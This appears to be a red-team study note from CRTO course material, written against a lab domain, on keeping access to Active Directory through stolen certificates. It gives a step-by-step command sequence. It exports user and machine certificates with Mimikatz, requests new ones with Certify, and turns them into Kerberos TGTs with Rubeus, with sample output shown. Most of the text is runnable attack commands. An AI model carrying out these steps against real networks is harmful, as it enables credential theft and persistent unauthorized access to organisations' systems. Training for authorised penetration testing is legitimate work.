
Certificates tend to have a longer life compared to passwords.
They only become invalid if they're revoked by the CA. 
They don't rely on vulnerable templates.
We can extract certificates issued or request new ones. 

#### 🖊️ User Persistence

User certificates that have already been issued can be found in the user's Personal Certificate store. 

1) If we have a Beacon running on their machine, we can enumerate their certificates with Seatbelt.

`beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates`

  ⚠ Always ensure the certificate is used for client authentication.


==If the user does not have a certificate in their store, we can just request one with Certify.  ```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User ```

  
2) Export it with Mimikatz `crypto::certificates` (although it drops them to disk):

`beacon> mimikatz crypto::certificates /export`

3) Download it and Base64 encode the pfx file

`ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0`

4) Then use it with Rubeus to obtain a TGT.  The export password will be `1234`:

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /nowrap`

⚠ You may notice that this will request RC4 tickets by default.  You can force the use of AES256 by including the `/enctype:aes256` parameter.


#### 📔 Computer Persistence

We must **elevate** to extract those certificates

```
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

    Public export  : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.der'
    Private export : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.pfx'
```

2) Just like a user certificate, convert it and then use it to request the TGT:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=wkstn-1.dev.cyberbotic.io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\WKSTN-1$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIGYD[...]5pbw==
```

❗ If you want the certificate of another machine, you will use the `/machine` parameter but you must auto-elevate to SYSTEM and assume the identity of the computer account

`beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine`


#### ⚠ Opsec




### Properties
---
📆 created   {{20-02-2024}} 11:05
🏷️ tags: #redteam #crto 

---

